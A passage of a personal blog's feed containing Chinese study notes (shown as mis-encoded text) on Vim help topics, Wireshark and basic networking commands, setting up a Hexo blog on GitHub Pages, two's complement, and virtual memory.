class="headerlink" title="55 Distribution"></a>55 Distribution</h2><hr><h2 id="56-What-Now"><a href="#56-What-Now" class="headerlink" title="56 What Now?"></a>56 What Now?</h2><p>Read <code>:help highlight</code><br>Read <code>:help user-commands</code><br>Read <code>:help runtimepath</code><br>Read <code>:help ins-completion</code><br>Read <code>:help omnifunc</code><br>Read <code>:help come-omni</code><br>Read <code>:help quickfix.txt</code><br>Read <code>:help perl-using</code></p><p><img src="/media/16565746214097.png"></p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Wireshark ç½‘ç»œåˆ†æ</title>
    <link href="/2022/08/25/Wireshark%20%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90/"/>
    <url>/2022/08/25/Wireshark%20%E7%BD%91%E7%BB%9C%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h3 id="src"><a href="#src" class="headerlink" title="src"></a>src</h3><p>sourceçš„ç®€ç§°ã€‚</p><h1 id="åˆè¯•é”‹èŠ’"><a href="#åˆè¯•é”‹èŠ’" class="headerlink" title="åˆè¯•é”‹èŠ’"></a>åˆè¯•é”‹èŠ’</h1><p>ARPå¹¿æ’­æ˜¯åœ¨æ•´ä¸ªå±€åŸŸç½‘ã€‚</p><h2 id="æŸ¥è¯¢ç½‘ç»œé…ç½®"><a href="#æŸ¥è¯¢ç½‘ç»œé…ç½®" class="headerlink" title="æŸ¥è¯¢ç½‘ç»œé…ç½®"></a>æŸ¥è¯¢ç½‘ç»œé…ç½®</h2><blockquote><p>ifconfig |egrep â€œHWaddr|inet addrâ€<br>route |grep default</p></blockquote><h2 id="VLANçš„ä½œç”¨"><a href="#VLANçš„ä½œç”¨" class="headerlink" title="VLANçš„ä½œç”¨"></a>VLANçš„ä½œç”¨</h2><p>æŠŠè¿æ¥åœ¨åŒä¸€äº¤æ¢æœºä¸‹çš„ä¸»æœºåˆ†ä¸ºæ›´å°çš„é€»è¾‘ç½‘æ®µï¼Œä»¥å‡å°‘å¹¿æ’­çš„æ•°é‡ï¼Œ</p><p>ä¸åŒçš„VLANä¹‹é—´ä¸èƒ½é€šè®¯,è¿™æ ·å¹¿æ’­å°±è¢«é™åˆ¶åœ¨åŒä¸€ä¸ªä¸šåŠ¡éœ€æ±‚ä¸»æœºçš„VLANé‡Œ,</p><p>å³ä¾¿æ˜¯è¿æ¥åœ¨åŒä¸€ä¸ªäº¤æ¢æœºä¸‹,ä¸åŒçš„VLANä¹Ÿä¸ä¼šæ”¶åˆ°å¹¿æ’­çš„ARPè¯·æ±‚!â€</p><h2 id="ARPè¯·æ±‚"><a href="#ARPè¯·æ±‚" class="headerlink" title="ARPè¯·æ±‚"></a>ARPè¯·æ±‚</h2><p>é€šè¿‡å¹¿æ’­æŸ¥æ‰¾ã€‚</p><h2 id="æŸ¥çœ‹è·¯ç”±è¡¨"><a href="#æŸ¥çœ‹è·¯ç”±è¡¨" class="headerlink" title="æŸ¥çœ‹è·¯ç”±è¡¨"></a>æŸ¥çœ‹è·¯ç”±è¡¨</h2><blockquote><p>netstat -rn</p></blockquote><h2 id="æŠ€å·§"><a href="#æŠ€å·§" class="headerlink" title="æŠ€å·§"></a>æŠ€å·§</h2><p>ä¸€.æŠ“åŒ…<br>æŠ“åŒ…æ—¶åº”è¯¥å°½é‡åªæŠ“å¿…è¦çš„éƒ¨åˆ†ã€‚<br>1.åªæŠ“åŒ…å¤´ï¼Œè®¾ç½®æŠ“å–çš„é•¿åº¦ã€‚Captureâ€”-&gt;Optionsä¸­â€œLimit each packet toâ€</p><h3 id="tcpdumpå‘½ä»¤æŠ“åŒ…"><a href="#tcpdumpå‘½ä»¤æŠ“åŒ…" class="headerlink" title="tcpdumpå‘½ä»¤æŠ“åŒ…"></a>tcpdumpå‘½ä»¤æŠ“åŒ…</h3><p>ç”¨-så‚æ•°ã€‚</p><p>2.åªæŠ“å¿…è¦çš„åŒ…ã€‚åœ¨Capture Fliterä¸­è¾“å…¥å¦‚ï¼šâ€œhost10.32.200.131â€</p><h3 id="pingå‘½ä»¤èƒ½æŒ‡å®šå‘é€åŒ…çš„æ•°é‡å’Œå¤§å°"><a href="#pingå‘½ä»¤èƒ½æŒ‡å®šå‘é€åŒ…çš„æ•°é‡å’Œå¤§å°" class="headerlink" title="pingå‘½ä»¤èƒ½æŒ‡å®šå‘é€åŒ…çš„æ•°é‡å’Œå¤§å°"></a>pingå‘½ä»¤èƒ½æŒ‡å®šå‘é€åŒ…çš„æ•°é‡å’Œå¤§å°</h3><p>äºŒ.ä¸ªæ€§åŒ–è®¾ç½®<br>ä¸‰.è¿‡æ»¤<br>1.åè®®åè¿‡æ»¤<br>2.IPåœ°å€åŠ portå·<br>3.é¼ æ ‡å¸®å¿™è¿‡æ»¤</p><p>å››.è®©wiresharkè‡ªåŠ¨åˆ†æ</p><p>äº”.æœç´¢åŠŸèƒ½<br>Ctrl+F</p><h3 id="Gerald-Combs"><a href="#Gerald-Combs" class="headerlink" title="Gerald Combs"></a>Gerald Combs</h3><p>ç¼–å†™äº†Etherealï¼Œå³åæ¥çš„wireshark</p><h3 id="Sun-Microsysemså…¬å¸"><a href="#Sun-Microsysemså…¬å¸" class="headerlink" title="Sun Microsysemså…¬å¸"></a>Sun Microsysemså…¬å¸</h3><p>Sunæ˜¯Stanford University Networkçš„é¦–å­—æ¯ã€‚</p><h2 id="NFSåè®®"><a href="#NFSåè®®" class="headerlink" title="NFSåè®®"></a>NFSåè®®</h2><p>Network File Systemåè®®</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexoä¸ªäººåšå®¢æ­å»º</title>
    <link href="/2022/08/25/hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/08/25/hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<hr><p><a href="https://b23.tv/myHAg1B">å‚è€ƒbç«™ç¨‹åºç¾Š</a></p><hr><h2 id="æ“ä½œæ­¥éª¤"><a href="#æ“ä½œæ­¥éª¤" class="headerlink" title="æ“ä½œæ­¥éª¤"></a>æ“ä½œæ­¥éª¤</h2><p>é¦–å…ˆè¦å®‰è£…nodejså’Œnpmã€‚</p><pre><code class="hljs">node -vnpm -v</code></pre><p>æŸ¥çœ‹ç‰ˆæœ¬ã€‚</p><p>ä½¿ç”¨npmä¸‹è½½å¹¶åˆ‡æ¢é•œåƒæºï¼š</p><pre><code class="hljs">npm install -g cnpm --registry=https://registry.npm.taobao.org</code></pre><p>ä¸‹è½½hexo-cliï¼š</p><pre><code class="hljs">cnpm install -g hexo-cli</code></pre><p>åœ¨ç”¨æˆ·ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œåˆå§‹åŒ–è¿™ä¸ªæ–‡ä»¶å¤¹ï¼š</p><pre><code class="hljs">sudo mkdir Blogsudo hexo init</code></pre><p>å¯åŠ¨hexo</p><pre><code class="hljs">sudo hexo s</code></pre><h2 id="hexoåŸºæœ¬æ“çºµ"><a href="#hexoåŸºæœ¬æ“çºµ" class="headerlink" title="hexoåŸºæœ¬æ“çºµ"></a>hexoåŸºæœ¬æ“çºµ</h2><p>ä¸€èˆ¬ç”Ÿæˆå®Œä¹‹åå…ˆ<code>clean</code>, ç„¶å<code>generate</code>, æœ€å <code>server</code>. å°†å†…å®¹æ¨é€å¸¦githubä¸Šå»å°±æ˜¯<code>deploy</code>æ“ä½œã€‚</p><h3 id="åˆ›å»ºæ–°æ–‡ç« "><a href="#åˆ›å»ºæ–°æ–‡ç« " class="headerlink" title="åˆ›å»ºæ–°æ–‡ç« "></a>åˆ›å»ºæ–°æ–‡ç« </h3><pre><code class="hljs">hexo new â€œMy New Postâ€</code></pre><p><code>new</code>å¯ç®€å†™ä¸º<code>n</code>.<br>åˆ›å»ºçš„blogæ‰€åœ¨çš„ä½ç½®ï¼Œ<code>source/_posts</code>ä¸­ã€‚&#x2F;</p><h3 id="å¯åŠ¨hexo"><a href="#å¯åŠ¨hexo" class="headerlink" title="å¯åŠ¨hexo"></a>å¯åŠ¨hexo</h3><pre><code class="hljs">hexo server</code></pre><p><code>server</code>å¯ç®€å†™ä¸º<code>s</code></p><h3 id="æ–‡ä»¶ç”Ÿæˆ"><a href="#æ–‡ä»¶ç”Ÿæˆ" class="headerlink" title="æ–‡ä»¶ç”Ÿæˆ"></a>æ–‡ä»¶ç”Ÿæˆ</h3><p>åœ¨åˆ›å»ºå¹¶å†™å®Œä¸€ä¸ªæ–‡ç« ä¹‹åï¼Œè¦ç”Ÿæˆä¸€ä¸‹ã€‚</p><pre><code class="hljs">hexo generate</code></pre><p><code>generate</code>å¯ç®€å†™ä¸º<code>g</code>.</p><h3 id="åœ¨æœ¬åœ°4000ç«¯å£æ‰“å¼€"><a href="#åœ¨æœ¬åœ°4000ç«¯å£æ‰“å¼€" class="headerlink" title="åœ¨æœ¬åœ°4000ç«¯å£æ‰“å¼€"></a>åœ¨æœ¬åœ°4000ç«¯å£æ‰“å¼€</h3><p>ä¸€èˆ¬ç”¨æ¥æµ‹è¯•ã€‚</p><p>è¿™ä¸ªæ˜¯æœ¬åœ°çš„ï¼Œè¿˜æœªéƒ¨ç½²åˆ°è¿œç«¯ã€‚</p><h2 id="åšå®¢éƒ¨ç½²åˆ°Githubä¸Š"><a href="#åšå®¢éƒ¨ç½²åˆ°Githubä¸Š" class="headerlink" title="åšå®¢éƒ¨ç½²åˆ°Githubä¸Š"></a>åšå®¢éƒ¨ç½²åˆ°Githubä¸Š</h2><h3 id="åœ¨githubä¸Šæ–°å»ºä¸€ä¸ªä»“åº“ã€‚"><a href="#åœ¨githubä¸Šæ–°å»ºä¸€ä¸ªä»“åº“ã€‚" class="headerlink" title="åœ¨githubä¸Šæ–°å»ºä¸€ä¸ªä»“åº“ã€‚"></a>åœ¨githubä¸Šæ–°å»ºä¸€ä¸ªä»“åº“ã€‚</h3><p>åç§°ä¸ºï¼Œä»¥æˆ‘è‡ªå·±çš„ä¸ºä¾‹ï¼š</p><pre><code class="hljs">zKurisu.github.io</code></pre><h3 id="å®‰è£…gitæ’ä»¶ï¼š"><a href="#å®‰è£…gitæ’ä»¶ï¼š" class="headerlink" title="å®‰è£…gitæ’ä»¶ï¼š"></a>å®‰è£…gitæ’ä»¶ï¼š</h3><pre><code class="hljs">cnpm install --save hexo-deployer-git</code></pre><h3 id="é…ç½®-config-ymlæ–‡ä»¶æ·»åŠ ï¼š"><a href="#é…ç½®-config-ymlæ–‡ä»¶æ·»åŠ ï¼š" class="headerlink" title="é…ç½®_config.ymlæ–‡ä»¶æ·»åŠ ï¼š"></a>é…ç½®<code>_config.yml</code>æ–‡ä»¶æ·»åŠ ï¼š</h3><pre><code class="hljs">type: gitrepo: githubä¸Šçš„ä»“åº“branch: master</code></pre><h3 id="éƒ¨ç½²åˆ°è¿œç«¯ï¼š"><a href="#éƒ¨ç½²åˆ°è¿œç«¯ï¼š" class="headerlink" title="éƒ¨ç½²åˆ°è¿œç«¯ï¼š"></a>éƒ¨ç½²åˆ°è¿œç«¯ï¼š</h3><pre><code class="hljs">sudo hexo deploy</code></pre><p><code>deploy</code>å¯ç®€å†™ä¸º<code>d</code>.</p><p>è¿™æ—¶å°±å¯ä»¥ç”¨GitHubæ¥è®¿é—®äº†ã€‚</p><h2 id="è‡ªå®šä¹‰ä¸»é¢˜"><a href="#è‡ªå®šä¹‰ä¸»é¢˜" class="headerlink" title="è‡ªå®šä¹‰ä¸»é¢˜"></a>è‡ªå®šä¹‰ä¸»é¢˜</h2><p>githubä¸Šçš„ä»“åº“</p><pre><code class="hljs">http://github.com/litten/hexo-theme-yilia</code></pre><p>å…‹éš†åˆ°blogç›®å½•ä¸­ï¼š</p><pre><code class="hljs">sudo git clone ...</code></pre><p>ç„¶åé…ç½®åˆ°åšå®¢ä¸­ã€‚<br>ä¿®æ”¹<code>_config.yml</code>æ–‡ä»¶ä¸­çš„Themesã€‚</p><h2 id="é˜…è¯»å®˜æ–¹æ–‡æ¡£"><a href="#é˜…è¯»å®˜æ–¹æ–‡æ¡£" class="headerlink" title="é˜…è¯»å®˜æ–¹æ–‡æ¡£"></a>é˜…è¯»å®˜æ–¹æ–‡æ¡£</h2><hr><p><a href="https://hexo.io/docs/">å®˜æ–¹æ–‡æ¡£</a></p><hr><h3 id="hexoä¼šå¿½ç•¥-å¼€å¤´çš„æ–‡ä»¶"><a href="#hexoä¼šå¿½ç•¥-å¼€å¤´çš„æ–‡ä»¶" class="headerlink" title="hexoä¼šå¿½ç•¥_å¼€å¤´çš„æ–‡ä»¶"></a>hexoä¼šå¿½ç•¥_å¼€å¤´çš„æ–‡ä»¶</h3><p>é™¤äº†<code>_posts</code>.</p><hr><h3 id="publicæ–‡ä»¶"><a href="#publicæ–‡ä»¶" class="headerlink" title="publicæ–‡ä»¶"></a>publicæ–‡ä»¶</h3><p>å­˜æ”¾è¢«æ¸²æŸ“åçš„HTMLå’ŒMarkdownæ–‡ä»¶å’Œä¸€äº›å…¶ä»–å¤åˆ¶æ¥çš„æ–‡ä»¶ã€‚</p><hr><h2 id="Hexo-Theme-Fluid"><a href="#Hexo-Theme-Fluid" class="headerlink" title="Hexo Theme Fluid"></a>Hexo Theme Fluid</h2><p><a href="https://hexo.fluid-dev.com/links/">å®˜æ–¹æ‰‹å†Œ</a></p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åŸç ã€åç ã€è¡¥ç çš„äº§ç”Ÿ</title>
    <link href="/2022/08/25/%E5%8E%9F%E7%A0%81%E3%80%81%E5%8F%8D%E7%A0%81%E3%80%81%E8%A1%A5%E7%A0%81%E7%9A%84%E4%BA%A7%E7%94%9F/"/>
    <url>/2022/08/25/%E5%8E%9F%E7%A0%81%E3%80%81%E5%8F%8D%E7%A0%81%E3%80%81%E8%A1%A5%E7%A0%81%E7%9A%84%E4%BA%A7%E7%94%9F/</url>
    
    <content type="html"><![CDATA[<hr><p><a href="https://www.zhihu.com/question/352057791/answer/876413629">å‚è€ƒçŸ¥ä¹</a></p><hr><h2 id="è·å¾—è¡¥ç çš„æ–¹æ³•"><a href="#è·å¾—è¡¥ç çš„æ–¹æ³•" class="headerlink" title="è·å¾—è¡¥ç çš„æ–¹æ³•"></a>è·å¾—è¡¥ç çš„æ–¹æ³•</h2><p>å–ååŠ ä¸€ã€‚</p><h2 id="è¡¥ç ç”±æ¥"><a href="#è¡¥ç ç”±æ¥" class="headerlink" title="è¡¥ç ç”±æ¥"></a>è¡¥ç ç”±æ¥</h2><p>è¡¥ç çœŸæ­£åç§°å«â€œTwoâ€™s complementâ€.</p><p>åç çš„åç§°å«â€œOnesâ€™complementâ€.</p><p>åŸç å«â€œSign-Magnitudeâ€.</p><h3 id="Onesâ€™complement"><a href="#Onesâ€™complement" class="headerlink" title="Onesâ€™complement"></a>Onesâ€™complement</h3><p>è¿™é‡Œæ˜¯1çš„è¡¥é›†çš„æ„æ€ã€‚</p><p>åŸå§‹è®¡ç®—æ–¹å¼ï¼š</p><blockquote><p>-x &#x3D; [1111â€¦1] - x<br>ä¾‹å¦‚ï¼š<br>-1 &#x3D; 111111111 - 00000001 &#x3D; 11111110</p></blockquote><p>çœ‹èµ·æ¥åƒæ˜¯å–åçš„æ“ä½œã€‚</p><h3 id="Twoâ€™s-complement"><a href="#Twoâ€™s-complement" class="headerlink" title="Twoâ€™s complement"></a>Twoâ€™s complement</h3><p>åŸå§‹çš„è®¡ç®—æ–¹å¼:</p><blockquote><p>-x &#x3D; 2^w - x<br>è¿™é‡Œwè¡¨ç¤ºxæœ‰å¤šå°‘ä½ã€‚</p></blockquote><p>è¿™é‡Œçš„Twoå°±æ˜¯å¼å­é‡Œçš„2.</p><h4 id="è¡¥ç çš„ä¼˜åŠ¿"><a href="#è¡¥ç çš„ä¼˜åŠ¿" class="headerlink" title="è¡¥ç çš„ä¼˜åŠ¿"></a>è¡¥ç çš„ä¼˜åŠ¿</h4><p>æ— è®ºæ˜¯åŠ æ³•è¿ç®—è¿˜æ˜¯å‡æ³•è¿ç®—éƒ½æ˜¯åŠ æ³•è¿ç®—ã€‚</p><p>è¡¨ç¤ºå‡æ³•è¿ç®—æ—¶ï¼Œå¼å­ä¸­ä¸€ä¸ªæ˜¯è¡¥ç ï¼Œä¸€ä¸ªæ˜¯åŸç ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ</title>
    <link href="/2022/08/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    <url>/2022/08/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ"><a href="#æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ" class="headerlink" title="æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ"></a>æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ</h1><h2 id="ç¼“å­˜"><a href="#ç¼“å­˜" class="headerlink" title="ç¼“å­˜"></a>ç¼“å­˜</h2><p>æ•°æ®å¯¹è±¡æ¥è‡ªå…¶ä»–å­˜å‚¨ç»“æ„ã€‚</p><h2 id="å‘½ä¸­ä¸ä¸å‘½ä¸­"><a href="#å‘½ä¸­ä¸ä¸å‘½ä¸­" class="headerlink" title="å‘½ä¸­ä¸ä¸å‘½ä¸­"></a>å‘½ä¸­ä¸ä¸å‘½ä¸­</h2><p>å°±æ˜¯ç¼“å­˜çš„æ•°æ®ä¸­æ²¡æœ‰æ‰€éœ€è¦çš„</p><h2 id="è™šæ‹Ÿåœ°å€"><a href="#è™šæ‹Ÿåœ°å€" class="headerlink" title="è™šæ‹Ÿåœ°å€"></a>è™šæ‹Ÿåœ°å€</h2><p>è™šæ‹Ÿåœ°å€ç©ºé—´å¤§å°ä¸º2çš„Næ¬¡æ–¹ï¼ŒNä¸ºä½æ•°ã€‚<br>å…¶ç”±cpuå‘å‡ºï¼Œç»mmu(memory management unit)ç¿»è¯‘ï¼Œç„¶ååˆ°ä¸»å­˜ä¸­å–æ•°æ®ã€‚</p><p>ä¸€ä¸ªå¯¹è±¡æœ‰ä¸€ä¸ªç‰©ç†åœ°å€å’Œä¸€ä¸ªè™šæ‹Ÿåœ°å€ã€‚<br>åˆ†å‰²ä¸ºè™šæ‹Ÿé¡µã€‚</p><p>é¡µè¡¨åœ¨ç‰©ç†åœ°å€ä¸­ï¼Œé¡µè¡¨ä¸­æœ‰é¡µè¡¨æ¡ç›®pteï¼Œå…¶å«æœ‰æ•ˆä½ã€‚</p><p>cpuå¼•ç”¨æ¢å­˜åœ¨ä¸»å­˜ä¸­çš„è™šæ‹Ÿé¡µæ—¶ï¼Œä¼šæŸ¥çœ‹é¡µè¡¨ä¸­çš„æœ‰æ•ˆä½ï¼Œè¿›è€Œåˆ¤æ–­æ˜¯å¦ç¼ºé¡µã€‚</p><h2 id="æ–‡ä»¶åªè¯»çš„ä½œç”¨"><a href="#æ–‡ä»¶åªè¯»çš„ä½œç”¨" class="headerlink" title="æ–‡ä»¶åªè¯»çš„ä½œç”¨"></a>æ–‡ä»¶åªè¯»çš„ä½œç”¨</h2><p>ä¿æŠ¤æ–‡ä»¶ä¸è¢«ä¿®æ”¹ã€‚</p><h2 id="å †æ ˆ"><a href="#å †æ ˆ" class="headerlink" title="å †æ ˆ"></a>å †æ ˆ</h2><p>å †æ ˆç©ºé—´ä¼šæœ‰é¢„ç•™éƒ¨åˆ†ã€‚</p><p>ebpå¯„å­˜å™¨å’Œespå¯„å­˜å™¨åˆ’åˆ†åŒºåŸŸã€‚</p><p>è¿”å›å€¼ä¸€èˆ¬åœ¨eaxå’Œedxä¸­ã€‚ç¼–å†™ç¨‹åºå°½é‡ä¸è¿”å›å¤§äº4å­—èŠ‚çš„æ•°æ®ã€‚</p><p>æ ˆä¸Šçš„æ•°æ®åœ¨å‡½æ•°è¿”å›æ—¶ä¼šè¢«é‡Šæ”¾æ‰ã€‚</p><p>å †çš„ç©ºé—²é“¾è¡¨åˆ†é…æ³•ã€‚</p><h2 id="è™šæ‹Ÿå­˜å‚¨å™¨ç†è§£"><a href="#è™šæ‹Ÿå­˜å‚¨å™¨ç†è§£" class="headerlink" title="è™šæ‹Ÿå­˜å‚¨å™¨ç†è§£"></a>è™šæ‹Ÿå­˜å‚¨å™¨ç†è§£</h2><p>ä¸ºäº†ä½¿åˆ†å¸ƒåœ¨ç£ç›˜ä¸Šä¸åŒåœ°å€çš„æ•°æ®ï¼Œä½¿ç”¨åŒä¸€å—åœ°å€ç©ºé—´ï¼Œå³ä¸»å­˜ã€‚</p><p>ä½¿ç”¨è™šæ‹Ÿå­˜å‚¨å™¨ï¼Œè¿›ç¨‹ä¸ä¼šä¸ç‰©ç†å†…å­˜æ¥è§¦ã€‚</p><p>æ¯ä¸€é¡µçš„é¦–åœ°å€ä¸ºé¡µè¡¨æ¡ç›®ï¼Ÿ</p><p>é¡µè¡¨ï¼ŒPTEï¼Œç‰©ç†å­˜å‚¨å™¨ä½äºä¸»å­˜ä¸­ã€‚<br>è™šæ‹Ÿé¡µåœ¨ç£ç›˜ä¸­ã€‚</p><p>å¥½å¤„ï¼š</p><ul><li>å…±äº«é—®é¢˜ï¼Œå¤šä¸ªè¿›ç¨‹å¯æ˜ å°„åŒä¸€ä¸ªåœ°å€ã€‚</li><li>PTEå¯æ ‡è®°SUP,READ,WRITEä½ã€‚è¿åæ­¤ç±»å¸¸è§æŠ¥é”™â€œsegment faultâ€</li></ul><p>PTEä¸­å«æœ‰ç‰©ç†é¡µçš„èµ·å§‹ä½ç½®ï¼Œç‰©ç†é¡µä¸­ç¼“å­˜æœ‰è™šæ‹Ÿé¡µã€‚å› æ­¤ï¼Œè™šæ‹Ÿé¡µçš„ä½ç½®å°±æ˜¯ç‰©ç†é¡µçš„èµ·å§‹ä½ç½®+è™šæ‹Ÿé¡µé¢çš„åç§»ä½ç½®PPOã€‚</p><p>ç‰©ç†é¡µä¸€èˆ¬å¤§äºè™šæ‹Ÿé¡µï¼Œæ¯•ç«Ÿè¦ç¼“å­˜è™šæ‹Ÿé¡µã€‚</p><p>è™šæ‹Ÿé¡µåç§»é‡VPOç­‰äºç‰©ç†é¡µåç§»é‡PPOã€‚</p><p>ç‰©ç†å†…å­˜(è¿™é‡ŒæŒ‡ç£ç›˜ä¸Šçš„å†…å­˜)+äº¤æ¢å†…å­˜(è¿™é‡ŒæŒ‡ä¸»å­˜)&#x3D;è™šæ‹Ÿå†…å­˜<br>ä½†æ˜¯è™šæ‹Ÿå­˜å‚¨å™¨åœ¨ç£ç›˜ä¸Šï¼Œç‰©ç†å­˜å‚¨å™¨åœ¨ä¸»å­˜ä¸Šã€‚</p><ul><li>è™šæ‹Ÿå†…å­˜å°±æ˜¯ç£ç›˜ä¸Šçš„å­˜å‚¨ç©ºé—´è¢«å½“ä½œå†…å­˜ä½¿ç”¨ï¼Œç£ç›˜ä¸å±äºå†…å­˜ï¼Œæ‰€ä»¥æ˜¯è™šæ‹Ÿå†…å­˜ã€‚</li><li>å®é™…å†…å­˜â€”-ç‰©ç†å†…å­˜ï¼Œè™šæ‹Ÿå†…å­˜â€”-ç£ç›˜ä¸Šçš„ç©ºé—´ã€‚</li><li>ç½®æ¢(swap),æŠŠå†…å­˜ä¸Šçš„å†…å®¹å’Œç£ç›˜ä¸Šçš„è™šæ‹Ÿå†…å­˜ä¸­çš„å†…å®¹è¿›è¡Œéƒ¨åˆ†äº¤æ¢ã€‚</li><li>åŠ¨æ€é“¾æ¥åº“â€”-å®ç°æ–‡ä»¶å…±äº«ã€‚</li><li>32ä½ç³»ç»Ÿå¯¹åº”4Gè¿›ç¨‹ï¼Œ64ä½ç³»ç»Ÿå¯¹åº”8Gè¿›ç¨‹ã€‚</li></ul><h2 id="è™šæ‹Ÿå†…å­˜çš„å®ç°"><a href="#è™šæ‹Ÿå†…å­˜çš„å®ç°" class="headerlink" title="è™šæ‹Ÿå†…å­˜çš„å®ç°"></a>è™šæ‹Ÿå†…å­˜çš„å®ç°</h2><p>ç”±ç‰©ç†å†…å­˜å’Œç£ç›˜ä¸Šçš„äº¤æ¢ç©ºé—´ç»„æˆè™šæ‹Ÿå†…å­˜ã€‚</p><p>åªè¦Linuxç³»ç»Ÿåœ¨è¿è¡Œï¼Œäº¤æ¢å°±ä¸€ç›´åœ¨è¿›è¡Œã€‚</p><h2 id="è™šæ‹Ÿå†…å­˜å†ç†è§£"><a href="#è™šæ‹Ÿå†…å­˜å†ç†è§£" class="headerlink" title="è™šæ‹Ÿå†…å­˜å†ç†è§£"></a>è™šæ‹Ÿå†…å­˜å†ç†è§£</h2><p>è™šæ‹Ÿé¡µç¼“å­˜åœ¨ç‰©ç†é¡µä¸­ï¼Œè‹¥ä¸å‘½ä¸­ï¼Œåˆ™å‘ç”Ÿé¡µç‰ºç‰²ï¼Œæ›¿æ¢è¿›éœ€è¦çš„è™šæ‹Ÿé¡µï¼Œå‘½ä¸­å‘ç”Ÿæ—¶ï¼Œcpuå‘å‡ºè™šæ‹Ÿåœ°å€ï¼Œç»mmuåœ°å€ç¿»è¯‘åä¸ºç‰©ç†åœ°å€ï¼Œè¿™ä¸ªç‰©ç†åœ°å€æ˜¯ç‰©ç†é¡µçš„åœ°å€ã€‚</p><p>æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½ä¼šè¢«åˆ†é…å¤§å°ä¸€å®šçš„è™šæ‹Ÿå†…å­˜ï¼Œä½†å®é™…æ¶ˆè€—çš„å¤§å°ä¸åŒã€‚</p><p>è™šæ‹Ÿé¡µä¸€èˆ¬å¾ˆå¤§ï¼Œ4KBï½2MBã€‚</p><p>é¡µè¡¨å­˜å‚¨åœ°å€ç¿»è¯‘çš„ä¿¡æ¯ï¼Œé¡µè¡¨æ˜¯é¡µè¡¨æ¡ç›®çš„æ•°ç»„ï¼Œè™šæ‹Ÿç©ºé—´ä¸­çš„æ¯ä¸ªé¡µéƒ½æœ‰ä¸€ä¸ªé¡µè¡¨æ¡ç›®ã€‚<br>ä»è¿™é‡Œå¯ä»¥çœ‹å‡ºï¼Œcpuè¦æ‰¾ä¸€ä¸ªè™šæ‹Ÿé¡µï¼Œå°±å¾—æŸ¥çœ‹é¡µè¡¨ä¸­çš„é¡µè¡¨æ¡ç›®ã€‚PTEè¡¨æ˜äº†æ˜¯å“ªä¸ªè™šæ‹Ÿé¡µï¼Œç¼“å­˜åœ¨å“ªä¸ªç‰©ç†é¡µåŠç‰©ç†é¡µçš„ä½ç½®ã€‚<br>PTEä¸­çš„åœ°å€å­—æ®µæœ‰ä¸‰ç§æƒ…å†µï¼š</p><blockquote><ol><li>ç‰©ç†é¡µçš„èµ·å§‹åœ°å€(æœ‰æ•ˆä½è¢«è®¾ç½®)</li><li>ç©ºç™½(æœ‰æ•ˆä½æ²¡è¢«è®¾ç½®ï¼Œè™šæ‹Ÿé¡µæœªåˆ†é…)</li><li>è™šæ‹Ÿé¡µçš„èµ·å§‹ä½ç½®(æœ‰æ•ˆä½æ²¡è¢«è®¾ç½®)</li></ol></blockquote><p><em>æ€»çš„è¯´</em>ï¼Œç¨‹åºéƒ½ä¼šä»ç£ç›˜è¾“é€åˆ°ä¸»å­˜ä¸­ã€‚<br>æ¯ä¸ªè¿›ç¨‹æœ‰å•ç‹¬çš„é¡µè¡¨ã€‚</p><h3 id="è™šæ‹Ÿåœ°å€çš„ç»„æˆ"><a href="#è™šæ‹Ÿåœ°å€çš„ç»„æˆ" class="headerlink" title="è™šæ‹Ÿåœ°å€çš„ç»„æˆ"></a>è™šæ‹Ÿåœ°å€çš„ç»„æˆ</h3><p>è™šæ‹Ÿåœ°å€åç§»é‡vpoå’Œè™šæ‹Ÿé¡µè¡¨å·vpnã€‚é¡µé¢å¤§å°å†³å®šåç§»é‡å¤§å°ã€‚<br>ç‰©ç†åœ°å€åŒæ ·åŒ…å«ppoå’Œppnã€‚</p><h2 id="ä½¿ç”¨è™šæ‹Ÿåœ°å€çš„å¥½å¤„"><a href="#ä½¿ç”¨è™šæ‹Ÿåœ°å€çš„å¥½å¤„" class="headerlink" title="ä½¿ç”¨è™šæ‹Ÿåœ°å€çš„å¥½å¤„"></a>ä½¿ç”¨è™šæ‹Ÿåœ°å€çš„å¥½å¤„</h2><p>ç®€åŒ–å†…å­˜ç®¡ç†ï¼Œæä¾›è‡ªç„¶çš„ä¿æŠ¤å†…å­˜çš„æ–¹æ³•ã€‚</p><h2 id="å¤šçº§é¡µè¡¨"><a href="#å¤šçº§é¡µè¡¨" class="headerlink" title="å¤šçº§é¡µè¡¨"></a>å¤šçº§é¡µè¡¨</h2><p>ç”¨äºå‹ç¼©é¡µè¡¨ï¼Œä¸€çº§é¡µè¡¨æ˜¯æœ€å†…å±‚çš„é¡µè¡¨</p><h2 id="è¿›ç¨‹"><a href="#è¿›ç¨‹" class="headerlink" 